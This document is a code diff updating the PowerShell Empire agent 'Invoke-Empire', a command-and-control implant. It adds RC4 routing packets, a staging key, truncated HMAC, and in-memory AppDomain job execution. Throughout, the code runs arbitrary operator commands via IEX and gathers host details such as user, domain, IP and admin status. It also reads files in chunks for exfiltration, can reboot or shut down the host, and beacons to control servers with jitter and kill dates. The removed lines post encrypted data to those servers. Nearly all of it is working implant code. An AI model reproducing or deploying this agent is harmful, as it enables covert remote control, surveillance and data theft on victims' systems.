@@ -8,8 +8,11 @@ function Invoke-Empire {
         Author: @harmj0y
         License: BSD 3-Clause
 
+        .PARAMETER StagingKey
+        The server staging key.
+
         .PARAMETER SessionKey
-        Server AES session key to use for communications
+        Client-specific AES session key to use for communications
 
         .PARAMETER SessionID
         A unique alphanumeric sessionID to use for identification
@@ -30,17 +33,18 @@ function Invoke-Empire {
         http communication profile
         request_uris(comma separated)|UserAgents(comma separated)
 
-        .PARAMETER Epoch
-        server epoch time, defaults to client time
-
         .PARAMETER LostLimit
         The limit of the number of checkins the agent will miss before exiting
 
-        .PARAMETER DefaultPage
-        The default page string Base64 encoded
+        .PARAMETER DefaultResponse
+        A base64 representation of the default response for the given transport.
     #>
 
     param(
+        [Parameter(Mandatory=$true)]
+        [String]
+        $StagingKey,
+
         [Parameter(Mandatory=$true)]
         [String]
         $SessionKey,
@@ -68,92 +72,102 @@ function Invoke-Empire {
         $WorkingHours,
 
         [String]
-        $Profile = "/admin/get.php,/news.asp,/login/process.jsp|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
-
-        [Int32]
-        $Epoch = [int][double]::Parse((Get-Date(Get-Date).ToUniversalTime()-UFormat %s)),
+        $Profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
 
         [Int32]
         $LostLimit = 60,
 
         [String]
-        $DefaultPage = ""
+        $DefaultResponse = ""
     )
 
     ############################################################
+    #
     # Configuration data
+    #
     ############################################################
-    
+
+    $Encoding = [System.Text.Encoding]::ASCII
+    $HMAC = New-Object System.Security.Cryptography.HMACSHA256
+
     $script:AgentDelay = $AgentDelay
     $script:AgentJitter = $AgentJitter
     $script:LostLimit = $LostLimit
     $script:MissedCheckins = 0
-    $script:DefaultPage = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($DefaultPage))
-    
-    $encoding = [System.Text.Encoding]::ASCII
+    $script:ResultIDs = @{}
+    $script:DefaultResponse = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($DefaultResponse))
 
+    # the currently active server
+    $Script:ServerIndex = 0
+    $Script:ControlServers = $Servers
+
+    # the number of times to retry server connections, i.e. the 'lost limit
     $Retries = 1
 
-    # c2 server list, by parameter or preloaded on staging
-    if(-not $Servers){
-        return
-    }
-    # the currently active server
-    $ServerIndex = 0
-
     # set a kill date of $KillDays out if specified
-    if($KillDays){
-        $script:KillDate = (get-date).AddDays($KillDays).ToString('MM/dd/yyyy')
+    if($KillDays) {
+        $script:KillDate = (Get-Date).AddDays($KillDays).ToString('MM/dd/yyyy')
     }
-
-    # extract out our http comms profile
-    $script:TaskURIs = $Profile.split("|")[0].split(",")
-    $UserAgent = $Profile.split("|")[1]
 
     # get all the headers/etc. in line for our comms
-    $script:Cookie = "SESSIONID=$SessionID"
+    #   Profile format:
+    #       uris(comma separated)|UserAgent|header1=val|header2=val2...
+    #       headers are optional. format is "key:value"
+    #       ex- cookies are "cookie:blah=123;meh=456"
+    $ProfileParts = $Profile.split('|')
+    $script:TaskURIs = $ProfileParts[0].split(',')
+    $script:UserAgent = $ProfileParts[1]
     $script:SessionID = $SessionID
-    $script:UserAgent = $UserAgent;
     $script:Headers = @{}
-
     # add any additional request headers if there are any specified in the profile
-    $parts = $Profile.split("|")
-    if($parts[2]){
-        $HeadersRaw = $parts[2..$parts.length]
+    if($ProfileParts[2]) {
+        $ProfileParts[2..$ProfileParts.length] | ForEach-Object {
+            $Parts = $_.Split(':')
+            $script:Headers.Add($Parts[0],$Parts[1])
+        }
     }
 
-    # add any additional request headers if there are any specified in the profile
-    if($HeadersRaw){
-        $HeadersRaw | %{
-            $key = $_.split(":")[0]
-            $value = $_.split(":")[1]
+    # keep track of all background jobs
+    #   format: {'RandomJobName' : @{'Alias'=$RandName; 'AppDomain'=$AppDomain; 'PSHost'=$PSHost; 'Job'=$Job; 'Buffer'=$Buffer}, ... }
+    $Script:Jobs = @{}
 
-            if ($key-eq "Cookie"){
-                # make sure we append this cookie value to the sessionID original
-                $script:Cookie = $script:Cookie + ";" +$value
+    # the currently imported script held in memory
+    $script:ImportedScript = ''
 
-            }
-            else{
-                $script:Headers.Add($key,$value)
+    ############################################################
+    #
+    # Command Helpers
+    #
+    ############################################################
+
+    function ConvertTo-Rc4ByteStream {
+        # RC4 encryption/decryption
+        #   used in New-RoutingPacket/Decode-RoutingPacket
+        Param ($In, $RCK)
+        begin {
+            [Byte[]] $S = 0..255;
+            $J = 0;
+            0..255 | ForEach-Object {
+                $J = ($J + $S[$_] + $RCK[$_ % $RCK.Length]) % 256;
+                $S[$_], $S[$J] = $S[$J], $S[$_];
+            };
+            $I = $J = 0;
+        }
+        process {
+            ForEach($Byte in $In) {
+                $I = ($I + 1) % 256;
+                $J = ($J + $S[$I]) % 256;
+                $S[$I], $S[$J] = $S[$J], $S[$I];
+                $Byte -bxor $S[($S[$I] + $S[$J]) % 256];
             }
         }
     }
 
-    # background jobs created with format $JobNameBase_[rand]
-    $JobNameBase = "Debug32"
+    function Get-HexString {
+        param([byte]$Data)
+        ($Data | ForEach-Object { "{0:X2}" -f $_ }) -join ' '
+    }
 
-    # the currently imported script held in memory
-    $script:importedScript = ""
-
-    # calculate the diff between the servers epoch and the agent's
-    $script:EpochDiff = $Epoch - [int][double]::Parse((Get-Date(Get-Date).ToUniversalTime()-UFormat %s))
-
-
-    ############################################################
-    # Command Helpers
-    ############################################################
-
-    # set the delay/jitter
     function Set-Delay {
         param([int]$d, [double]$j=0.0)
         $script:AgentDelay = $d
@@ -161,7 +175,6 @@ function Invoke-Empire {
         "agent interval set to $script:AgentDelay seconds with a jitter of $script:AgentJitter"
     }
 
-    # get the delay/jitter
     function Get-Delay {
         "agent interval delay interval: $script:AgentDelay seconds with a jitter of $script:AgentJitter"
     }
@@ -173,67 +186,67 @@ function Invoke-Empire {
         {
             "agent set to never die based on checkin Limit"
         }
-        else 
+        else
         {
             "agent LostLimit set to $script:LostLimit"
         }
     }
+
     function Get-LostLimit {
         "agent LostLimit: $script:LostLimit"
     }
 
-    # set the killdate for the agent
     function Set-Killdate {
         param([string]$date)
         $script:KillDate = $date
         "agent killdate set to $script:KillDate"
     }
 
-    # get the killdate for the agent
     function Get-Killdate {
         "agent killdate: $script:KillDate"
     }
 
-    # set the working hours for the agent
     function Set-WorkingHours {
         param([string]$hours)
         $script:WorkingHours = $hours
         "agent working hours set to $script:WorkingHours"
     }
 
-    # get the working hours for the agent
     function Get-WorkingHours {
         "agent working hours: $script:WorkingHours"
     }
 
-    # basic system information
     function Get-Sysinfo {
-        $str = $Servers[$ServerIndex]
+        $str = '0|' # no nonce for normal execution
+        $str += $Script:ControlServers[$Script:ServerIndex]
         $str += '|' + [Environment]::UserDomainName+'|'+[Environment]::UserName+'|'+[Environment]::MachineName;
         $p = (Get-WmiObject Win32_NetworkAdapterConfiguration|Where{$_.IPAddress}|Select -Expand IPAddress);
-        $str += '|' +@{$true=$p[0];$false=$p}[$p.Length -lt 6];
+        $ip = @{$true=$p[0];$false=$p}[$p.Length -lt 6];
+        #if(!$ip -or $ip.trim() -eq '') {$ip='0.0.0.0'};
+        $str+="|$ip"
+
         $str += '|' +(Get-WmiObject Win32_OperatingSystem).Name.split('|')[0];
         # if we're SYSTEM, we're high integrity
-        if(([Environment]::UserName).ToLower() -eq "system"){
+        if(([Environment]::UserName).ToLower() -eq 'system') {
             $str += '|True'
         }
         else{
-            # otherwise check the groups
-            $str += '|'+ ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
+            # otherwise check the token groups
+            $str += '|'+ ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')
         }
         $n = [System.Diagnostics.Process]::GetCurrentProcess();
         $str += '|'+$n.ProcessName+'|'+$n.Id;
-        $str += '|' + $PSVersionTable.PSVersion.Major
+        $str += "|powershell|" + $PSVersionTable.PSVersion.Major;
         $str
     }
 
-    # add additional callback servers
-    function Add-Servers {
-        param([string[]]$BackupServers)
-        foreach ($backup in $BackupServers) {
-            $Servers = $Servers + $backup
-        }
-    }
+    # # TODO: add additional callback servers ?
+    # function Add-Servers {
+    #     param([string[]]$BackupServers)
+    #     foreach ($backup in $BackupServers) {
+    #         $Script:ControlServers = $Script:ControlServers + $backup
+    #     }
+    # }
 
     # handle shell commands and return any results
     function Invoke-ShellCommand {
@@ -247,11 +260,12 @@ function Invoke-Empire {
             $cmdargs = $cmdargs -replace "\\\\","FileSystem::\\"
         }
 
-        $output = ""
-        if ($cmd.ToLower() -eq "shell") {
+        $output = ''
+        if ($cmd.ToLower() -eq 'shell') {
             # if we have a straight 'shell' command, skip the aliases
-            if ($cmdargs.length -eq ""){ $output = "no shell command supplied" }
+            if ($cmdargs.length -eq '') { $output = 'no shell command supplied' }
             else { $output = IEX "$cmdargs" }
+            $output += "`n`r..Command execution completed."
         }
         else {
             switch -regex ($cmd) {
@@ -269,18 +283,18 @@ function Invoke-Empire {
                     }
                 }
                 '(mv|move|copy|cp|rm|del|rmdir)' {
-                    if ($cmdargs.length -ne "") { 
+                    if ($cmdargs.length -ne "") {
                         try {
                             IEX "$cmd $cmdargs -Force -ErrorAction Stop"
                             $output = "executed $cmd $cmdargs"
-                        } 
+                        }
                         catch {
                             $output=$_.Exception;
                         }
-                    }                    
+                    }
                 }
-                cd { 
-                    if ($cmdargs.length -ne "")
+                cd {
+                    if ($cmdargs.length -ne '')
                     {
                         $cmdargs = $cmdargs.trim("`"").trim("'")
                         cd "$cmdargs"
@@ -288,7 +302,7 @@ function Invoke-Empire {
                     }
                 }
                 '(ipconfig|ifconfig)' {
-                    $output = Get-WmiObject -class "Win32_NetworkAdapterConfiguration" | ? {$_.IPEnabled -Match "True"} | % {
+                    $output = Get-WmiObject -class 'Win32_NetworkAdapterConfiguration' | ? {$_.IPEnabled -Match 'True'} | ForEach-Object {
                         $out = New-Object psobject
                         $out | Add-Member Noteproperty 'Description' $_.Description
                         $out | Add-Member Noteproperty 'MACAddress' $_.MACAddress
@@ -300,23 +314,23 @@ function Invoke-Empire {
                         $out | Add-Member Noteproperty 'DNSHostName' $_.DNSHostName
                         $out | Add-Member Noteproperty 'DNSSuffix' $($_.DNSDomainSuffixSearchOrder -join ",")
                         $out
-                    } | fl | Out-String | %{$_ + "`n"}
+                    } | fl | Out-String | ForEach-Object {$_ + "`n"}
                 }
                 # this is stupid how complicated it is to get this information...
-                '(ps|tasklist)' { 
+                '(ps|tasklist)' {
                     $owners = @{}
-                    Get-WmiObject win32_process | % {$o = $_.getowner(); if(-not $($o.User)){$o="N/A"} else {$o="$($o.Domain)\$($o.User)"}; $owners[$_.handle] = $o}
-                    if($cmdargs -ne "") { $p = $cmdargs }
+                    Get-WmiObject win32_process | ForEach-Object {$o = $_.getowner(); if(-not $($o.User)) {$o='N/A'} else {$o="$($o.Domain)\$($o.User)"}; $owners[$_.handle] = $o}
+                    if($cmdargs -ne '') { $p = $cmdargs }
                     else{ $p = "*" }
-                    $output = Get-Process $p | % {
-                        $arch = "x64"
-                        if ([System.IntPtr]::Size -eq 4){
-                            $arch = "x86"
+                    $output = Get-Process $p | ForEach-Object {
+                        $arch = 'x64'
+                        if ([System.IntPtr]::Size -eq 4) {
+                            $arch = 'x86'
                         }
                         else{
                             foreach($module in $_.modules) {
                                 if([System.IO.Path]::GetFileName($module.FileName).ToLower() -eq "wow64.dll") {
-                                    $arch = "x86"
+                                    $arch = 'x86'
                                     break
                                 }
                             }
@@ -333,21 +347,21 @@ function Invoke-Empire {
                 }
                 getpid { $output = [System.Diagnostics.Process]::GetCurrentProcess() }
                 route {
-                    if (($cmdargs.length -eq "") -or ($cmdargs.lower() -eq "print")){ 
+                    if (($cmdargs.length -eq '') -or ($cmdargs.lower() -eq 'print')) {
                         # build a table of adapter interfaces indexes -> IP address for the adapater
                         $adapters = @{}
-                        Get-WmiObject Win32_NetworkAdapterConfiguration | %{ $adapters[[int]($_.InterfaceIndex)] = $_.IPAddress }
-                        $output = Get-WmiObject win32_IP4RouteTable | %{
+                        Get-WmiObject Win32_NetworkAdapterConfiguration | ForEach-Object { $adapters[[int]($_.InterfaceIndex)] = $_.IPAddress }
+                        $output = Get-WmiObject win32_IP4RouteTable | ForEach-Object {
                             $out = New-Object psobject
                             $out | Add-Member Noteproperty 'Destination' $_.Destination
                             $out | Add-Member Noteproperty 'Netmask' $_.Mask
-                            if ($_.NextHop -eq "0.0.0.0"){
-                                $out | Add-Member Noteproperty 'NextHop' "On-link"
+                            if ($_.NextHop -eq "0.0.0.0") {
+                                $out | Add-Member Noteproperty 'NextHop' 'On-link'
                             }
                             else{
                                 $out | Add-Member Noteproperty 'NextHop' $_.NextHop
                             }
-                            if($adapters[$_.InterfaceIndex] -and ($adapters[$_.InterfaceIndex] -ne "")){
+                            if($adapters[$_.InterfaceIndex] -and ($adapters[$_.InterfaceIndex] -ne "")) {
                                 $out | Add-Member Noteproperty 'Interface' $($adapters[$_.InterfaceIndex] -join ",")
                             }
                             else {
@@ -356,6 +370,7 @@ function Invoke-Empire {
                             $out | Add-Member Noteproperty 'Metric' $_.Metric1
                             $out
                         } | ft -autosize | Out-String
+                        
                     }
                     else { $output = route $cmdargs }
                 }
@@ -366,7 +381,7 @@ function Invoke-Empire {
                 '(reboot|restart)' { Restart-Computer -force }
                 shutdown { Stop-Computer -force }
                 default {
-                    if ($cmdargs.length -eq ""){ $output = IEX $cmd }
+                    if ($cmdargs.length -eq '') { $output = IEX $cmd }
                     else { $output = IEX "$cmd $cmdargs" }
                 }
             }
@@ -374,17 +389,64 @@ function Invoke-Empire {
         "`n"+($output | Format-Table -wrap | Out-String)
     }
 
+    # takes a string representing a PowerShell script to run, build a new
+    #   AppDomain and PowerShell runspace, and kick off the execution in the
+    #   new runspace/AppDomain asynchronously, storing the results in $Script:Jobs.
     function Start-AgentJob {
-        param($data)
+        param($ScriptString)
 
-        # generate a randomized job name
-        $r=1..5|ForEach-Object{Get-Random -max 36};
-        $type=('abcdefghijklmnopqrstuvwxyz1234567890'[$r] -join '');
-        $JobName = $JobNameBase + "_" + $type
+        $RandName = -join("ABCDEFGHKLMNPRSTUVWXYZ123456789".ToCharArray()|Get-Random -Count 6)
 
-        # kick this code off in the background
-        $job = Start-Job -Name $JobName -Scriptblock ([scriptblock]::Create($data))
-        $job.Name
+        # create our new AppDomain
+        $AppDomain = [AppDomain]::CreateDomain($RandName)
+
+        # load the PowerShell dependency assemblies in the new runspace and instantiate a PS runspace
+        $PSHost = $AppDomain.Load([PSObject].Assembly.FullName).GetType('System.Management.Automation.PowerShell')::Create()
+
+        # add the target script into the new runspace/appdomain
+        $null = $PSHost.AddScript($ScriptString)
+
+        # stupid v2 compatibility...
+        $Buffer = New-Object 'System.Management.Automation.PSDataCollection[PSObject]'
+        $PSobjectCollectionType = [Type]'System.Management.Automation.PSDataCollection[PSObject]'
+        $BeginInvoke = ($PSHost.GetType().GetMethods() | ? { $_.Name -eq 'BeginInvoke' -and $_.GetParameters().Count -eq 2 }).MakeGenericMethod(@([PSObject], [PSObject]))
+
+        # kick off asynchronous execution
+        $Job = $BeginInvoke.Invoke($PSHost, @(($Buffer -as $PSobjectCollectionType), ($Buffer -as $PSobjectCollectionType)))
+
+        $Script:Jobs[$RandName] = @{'Alias'=$RandName; 'AppDomain'=$AppDomain; 'PSHost'=$PSHost; 'Job'=$Job; 'Buffer'=$Buffer}
+        $RandName
+    }
+
+    # returns $True if the specified job is completed, $False otherwise
+    function Get-AgentJobCompleted {
+        param($JobName)
+        if($Script:Jobs.ContainsKey($JobName)) {
+            $Script:Jobs[$JobName]['Job'].IsCompleted
+        }
+    }
+
+    # reads any data from the output buffer preserved for the specified job
+    function Receive-AgentJob {
+        param($JobName)
+        if($Script:Jobs.ContainsKey($JobName)) {
+            $Script:Jobs[$JobName]['Buffer'].ReadAll()
+        }
+    }
+
+    # stops the specified agent job (wildcards accepted), returns any job results,
+    #   tear down the appdomain, and remove the job from the internal cache
+    function Stop-AgentJob {
+        param($JobName)
+        if($Script:Jobs.ContainsKey($JobName)) {
+            # kill the PS host
+            $Null = $Script:Jobs[$JobName]['PSHost'].Stop()
+            # get results
+            $Script:Jobs[$JobName]['Buffer'].ReadAll()
+            # unload the app domain runner
+            $Null = [AppDomain]::Unload($Script:Jobs[$JobName]['AppDomain'])
+            $Script:Jobs.Remove($JobName)
+        }
     }
 
     # update the http comms profile
@@ -396,40 +458,20 @@ function Invoke-Empire {
         #   headers are optional. format is "key:value"
         #   ex- cookies are "cookie:blah=123;meh=456"
 
-        # extract out the new tasking URIs
-        $script:TaskURIs = $Profile.split("|")[0].split(",")
-
-        # extract out the new UserAgent
-        $script:UserAgent = $Profile.split("|")[1]
-
-        # reset the cookie
-        $script:Cookie = "SESSIONID=$($script:SessionID)"
-
-        # reset the header hash table
+        $ProfileParts = $Profile.split('|')
+        $script:TaskURIs = $ProfileParts[0].split(',')
+        $script:UserAgent = $ProfileParts[1]
+        $script:SessionID = $SessionID
         $script:Headers = @{}
 
-        # get the new headers
-        $parts = $Profile.split("|")
-        if($parts[2]){
-            $HeadersRaw = $parts[2..$parts.length]
-        }
-
         # add any additional request headers if there are any specified in the profile
-        if($HeadersRaw){
-            $HeadersRaw | %{
-                $key = $_.split(":")[0]
-                $value = $_.split(":")[1]
-
-                if ($key-eq "Cookie"){
-                    # make sure we append this cookie value to the sessionID original
-                    $script:Cookie = $script:Cookie + ";" +$value
-
-                }
-                else{
-                    $script:Headers.Add($key,$value)
-                }
+        if($ProfileParts[2]) {
+            $ProfileParts[2..$ProfileParts.length] | ForEach-Object {
+                $Parts = $_.Split(':')
+                $script:Headers.Add($Parts[0],$Parts[1])
             }
         }
+
         "Agent updated with profile $Profile"
     }
 
@@ -437,7 +479,6 @@ function Invoke-Empire {
     # and return a base64 encoding of that file part (by default)
     # used by download functionality for large file
     function Get-FilePart {
-
         Param(
             [string] $File,
             [int] $Index = 0,
@@ -445,24 +486,24 @@ function Invoke-Empire {
             [switch] $NoBase64
         )
 
-        try{
+        try {
             $f = Get-Item "$File"
             $FileLength = $f.length
             $FromFile = [io.file]::OpenRead($File)
 
             if ($FileLength -lt $ChunkSize) {
-                if($Index -eq 0){
+                if($Index -eq 0) {
                     $buff = new-object byte[] $FileLength
                     $count = $FromFile.Read($buff, 0, $buff.Length)
-                    if($NoBase64){
-                        $buff;
+                    if($NoBase64) {
+                        $buff
                     }
                     else{
                         [System.Convert]::ToBase64String($buff)
                     }
                 }
                 else{
-                    $Null;
+                    $Null
                 }
             }
             else{
@@ -474,7 +515,7 @@ function Invoke-Empire {
                 $count = $FromFile.Read($buff, 0, $buff.Length)
 
                 if ($count -gt 0) {
-                    if($count -ne $ChunkSize){
+                    if($count -ne $ChunkSize) {
                         # if we're on the last file chunk
 
                         # create a new array of the appropriate length
@@ -482,16 +523,16 @@ function Invoke-Empire {
                         # and copy the relevant data into it
                         [array]::copy($buff, $buff2, $count)
 
-                        if($NoBase64){
-                            $buff2;
+                        if($NoBase64) {
+                            $buff2
                         }
                         else{
                             [System.Convert]::ToBase64String($buff2)
                         }
                     }
                     else{
-                        if($NoBase64){
-                            $buff;
+                        if($NoBase64) {
+                            $buff
                         }
                         else{
                             [System.Convert]::ToBase64String($buff)
@@ -499,7 +540,7 @@ function Invoke-Empire {
                     }
                 }
                 else{
-                    $Null; 
+                    $Null;
                 }
             }
         }
@@ -511,166 +552,250 @@ function Invoke-Empire {
 
 
     ############################################################
-    # Encryption functions
+    #
+    # Core agent encryption/packet processing function
+    #
     ############################################################
 
-    function Encrypt-Bytes { 
+    function Encrypt-Bytes {
         param($bytes)
         # get a random IV
         $IV = [byte] 0..255 | Get-Random -count 16
-        $AES = New-Object System.Security.Cryptography.AesCryptoServiceProvider;
+        try {
+            $AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
+        }
+        catch {
+            $AES=New-Object System.Security.Cryptography.RijndaelManaged;
+        }
         $AES.Mode = "CBC";
-        $AES.Key = $encoding.GetBytes($SessionKey);
+        $AES.Key = $Encoding.GetBytes($SessionKey);
         $AES.IV = $IV;
         $ciphertext = $IV + ($AES.CreateEncryptor()).TransformFinalBlock($bytes, 0, $bytes.Length);
         # append the MAC
-        $hmac = New-Object System.Security.Cryptography.HMACSHA1;
-        $hmac.Key = $encoding.GetBytes($SessionKey);
-        $ciphertext + $hmac.ComputeHash($ciphertext);
-    } 
+        $HMAC.Key = $Encoding.GetBytes($SessionKey);
+        $ciphertext + $hmac.ComputeHash($ciphertext)[0..9];
+    }
 
-    function Decrypt-Bytes { 
+    function Decrypt-Bytes {
         param ($inBytes)
-        if($inBytes.Length -gt 32){
-            # Verify the MAC
-            $mac = $inBytes[-20..-1];
-            $inBytes = $inBytes[0..($inBytes.length - 21)];
-            $hmac = New-Object System.Security.Cryptography.HMACSHA1;
-            $hmac.Key = $encoding.GetBytes($SessionKey);
-            $expected = $hmac.ComputeHash($inBytes);
-            if (@(Compare-Object $mac $expected -sync 0).Length -ne 0){
+        if($inBytes.Length -gt 32) {
+            # Verify the HMAC
+            $mac = $inBytes[-10..-1];
+            $inBytes = $inBytes[0..($inBytes.length - 11)];
+            $hmac.Key = $Encoding.GetBytes($SessionKey);
+            $expected = $hmac.ComputeHash($inBytes)[0..9];
+            if (@(Compare-Object $mac $expected -sync 0).Length -ne 0) {
                 return;
             }
 
             # extract the IV
             $IV = $inBytes[0..15];
-            $AES = New-Object System.Security.Cryptography.AesCryptoServiceProvider;
+            try {
+                $AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
+            }
+            catch {
+                $AES=New-Object System.Security.Cryptography.RijndaelManaged;
+            }
             $AES.Mode = "CBC";
-            $AES.Key = $encoding.GetBytes($SessionKey);
+            $AES.Key = $Encoding.GetBytes($SessionKey);
             $AES.IV = $IV;
             ($AES.CreateDecryptor()).TransformFinalBlock(($inBytes[16..$inBytes.length]), 0, $inBytes.Length-16)
         }
     }
 
-    ############################################################
-    # C2 functions
-    ############################################################
+    function New-RoutingPacket {
+        param($EncData, $Meta)
+
+        # build the RC4 routing packet
+        #   Meta:
+        #       TASKING_REQUEST = 4
+        #       RESULT_POST = 5
+
+        if($EncData) {
+            $EncDataLen = $EncData.Length
+        }
+        else {
+            $EncDataLen = 0
+        }
+
+        $SKB = $Encoding.GetBytes($StagingKey)
+        $IV=[BitConverter]::GetBytes($(Get-Random));
+        $Data = $Encoding.GetBytes($script:SessionID) + @(0x01,$Meta,0x00,0x00) + [BitConverter]::GetBytes($EncDataLen)
+        $RoutingPacketData = ConvertTo-Rc4ByteStream -In $Data -RCK $($IV+$SKB)
+
+        if($EncData) {
+            ($IV + $RoutingPacketData + $EncData)
+        }
+        else {
+            ($IV + $RoutingPacketData)
+        }
+    }
+
+    function Decode-RoutingPacket {
+        param($PacketData)
+
+        <#
+        Decode a first level server-response "routing packet"
+
+            Routing packet structure:
+
+                [4 bytes randomIV]
+                RC4s(
+                    [8 bytes for sessionID]
+                    [1 byte for language]
+                    [1 byte for meta info]
+                    [2 bytes for extra info]
+                    [4 bytes for packet length]
+                )
+        #>
+
+        if ($PacketData.Length -ge 20) {
+
+            $Offset = 0
+
+            while($Offset -lt $PacketData.Length) {
+                # extract out the routing packet fields
+                $RoutingPacket = $PacketData[($Offset+0)..($Offset+19)]
+                $RoutingIV = $RoutingPacket[0..3]
+                $RoutingEncData = $RoutingPacket[4..19]
+                $Offset += 20
+
+                # get the staging key bytes
+                $SKB = $Encoding.GetBytes($StagingKey)
+
+                # decrypt the routing packet
+                $RoutingData = ConvertTo-Rc4ByteStream -In $RoutingEncData -RCK $($RoutingIV+$SKB)
+                $PacketSessionID = [System.Text.Encoding]::UTF8.GetString($RoutingData[0..7])
+                # write-host "PacketSessionID: $PacketSessionID"
+                # write-host "RoutingData len: $($RoutingData)"
+                # write-host "$([System.BitConverter]::ToString($RoutingData[0..15]))"
+                $Language = $RoutingData[8]
+                $Meta = $RoutingData[9]
+                # write-host "Meta: $Meta"
+                $Extra = $RoutingData[10..11]
+                $PacketLength = [BitConverter]::ToUInt32($RoutingData, 12)
+                
+                if ($PacketLength -lt 0) {
+                    # Write-Host "Invalid PacketLength: $PacketLength"
+                    break
+                }
+
+                if ($PacketSessionID -eq $script:SessionID) {
+                    # if this tasking is for us
+                    $EncData = $PacketData[$Offset..($Offset+$PacketLength-1)]
+                    $Offset += $PacketLength
+                    Process-TaskingPackets $EncData
+                }
+                else {
+                    # TODO: forward taskings on to other clients?
+                }
+            }
+        }
+        else {
+            # Write-Host "Invalid PacketData.Length: $($PacketData.Length)"
+        }
+    }
 
     function Encode-Packet {
-        param([int]$type, $data)
-        # encode a packet for transport
-        #   format - [type][counter][length][value]
+        param([Int16]$type, $data, [Int16]$ResultID=0)
+        <# 
+            encode a packet for transport:
+            +------+--------------------+----------+---------+--------+-----------+
+            | Type | total # of packets | packet # | task ID | Length | task data |
+            +------+--------------------+--------------------+--------+-----------+
+            |  2   |         2          |    2     |    2    |   4    | <Length>  |
+            +------+--------------------+----------+---------+--------+-----------+
+        #>
 
         # in case we get a result array, make sure we join everything up
-        if ($data -is [system.array]){
+        if ($data -is [System.Array]) {
             $data = $data -join "`n"
         }
-        
-        #convert data to base64 so we can support all encodings and handle on server side
-        $data = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.getbytes($data))
+
+        # convert data to base64 so we can support all encodings and handle on server side
+        $data = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($data))
 
         $packet = New-Object Byte[] (12 + $data.Length)
 
-        # calculate the counter = epochDiff from server + current epoch
-        $counter = $($script:EpochDiff + [int][double]::Parse((Get-Date(Get-Date).ToUniversalTime()-UFormat %s))) -as [int]
-
-        ([bitconverter]::GetBytes($type)).CopyTo($packet, 0)
-        ([bitconverter]::GetBytes($counter)).CopyTo($packet, 4)
-        ([bitconverter]::GetBytes($data.Length)).CopyTo($packet, 8)
-        ([System.Text.Encoding]::UTF8.getbytes($data)).CopyTo($packet, 12)
+        # packet type
+        ([BitConverter]::GetBytes($type)).CopyTo($packet, 0)
+        # total number of packets
+        ([BitConverter]::GetBytes([Int16]1)).CopyTo($packet, 2)
+        # packet number
+        ([BitConverter]::GetBytes([Int16]1)).CopyTo($packet, 4)
+        # task/result ID
+        ([BitConverter]::GetBytes($ResultID)).CopyTo($packet, 6)
+        # length
+        ([BitConverter]::GetBytes($data.Length)).CopyTo($packet, 8)
+        ([System.Text.Encoding]::UTF8.GetBytes($data)).CopyTo($packet, 12)
 
         $packet
     }
 
     function Decode-Packet {
         param($packet, $offset=0)
-        # we're decoding the raw decrypted bytes to [type][counter][length][value][remaining packet data]
+        # we're decoding the raw decrypted bytes to [type][# of packets][packet #][task ID][length][value][remaining packet data]
         # the calling logic can keep looking through the data blob,
         #   decoding additional packets as needed
-
-        $type = [bitconverter]::ToUInt32($packet, 0+$offset)
-        $counter = [bitconverter]::ToUInt32($packet, 4+$offset)
-        $length = [bitconverter]::ToUInt32($packet, 8+$offset)
-        $data = [System.Text.Encoding]::UTF8.GetString($packet[(12+$offset)..(12+$length+$offset-1)])
-        $remaining = [System.Text.Encoding]::UTF8.GetString($packet[(12+$length+$offset)..($packet.Length)])
+        $Type = [BitConverter]::ToUInt16($packet, 0+$offset)
+        $TotalPackets = [BitConverter]::ToUInt16($packet, 2+$offset)
+        $PacketNum = [BitConverter]::ToUInt16($packet, 4+$offset)
+        $TaskID = [BitConverter]::ToUInt16($packet, 6+$offset)
+        $Length = [BitConverter]::ToUInt32($packet, 8+$offset)
+        $Data = [System.Text.Encoding]::UTF8.GetString($packet[(12+$offset)..(12+$Length+$offset-1)])
+        $Remaining = [System.Text.Encoding]::UTF8.GetString($packet[(12+$Length+$offset)..($packet.Length)])
 
         Remove-Variable packet;
 
-        @($type,$counter,$length,$data,$remaining)
+        @($Type, $TotalPackets, $PacketNum, $TaskID, $Length, $Data, $Remaining)
     }
 
-    # send a message to the current C2 server
-    function Send-Message {
-        # param($type, $data)
-        param($packets)
 
-        if($packets) {
-            # build and encrypt the response packet
-            $encBytes = Encrypt-Bytes $packets
+    ############################################################
+    #
+    # C2 functions
+    #
+    ############################################################
 
-            if($Servers[$ServerIndex].StartsWith("http")){
-                # build the web request object
-                $wc = new-object system.net.WebClient
-                # set the proxy settings for the WC to be the default system settings
-                $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
-                $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
-                $wc.Headers.Add("User-Agent",$script:UserAgent)
-                $wc.Headers.Add("Cookie",$script:Cookie)
-                $script:Headers.GetEnumerator() | % {$wc.Headers.Add($_.Name, $_.Value)}
+    REPLACE_COMMS
 
-                try{
-                    # get a random posting URI
-                    $taskURI = $script:TaskURIs | Get-Random
-                    $response = $wc.UploadData($Servers[$ServerIndex]+$taskURI,"POST",$encBytes);
-                    # TODO: process response ID at all?
-                }
-                catch [System.Net.WebException]{
-                    # exception posting data...
-                    # TODO: handle? server fallback?
-                }
-            }
-        }
-    }
-
-    # process a single packet extracted from a tasking
-    function Process-Packet {
-        param($type, $msg)
+    # process a single tasking packet extracted from a tasking and execute the functionality
+    function Process-Tasking {
+        param($type, $msg, $ResultID)
 
         try {
-
             # sysinfo request
-            if($type -eq 1){
-                return Encode-Packet -type $type -data $(Get-Sysinfo)
+            if($type -eq 1) {
+                return Encode-Packet -type $type -data $(Get-Sysinfo) -ResultID $ResultID
             }
             # agent exit
-            elseif($type -eq 2){
+            elseif($type -eq 2) {
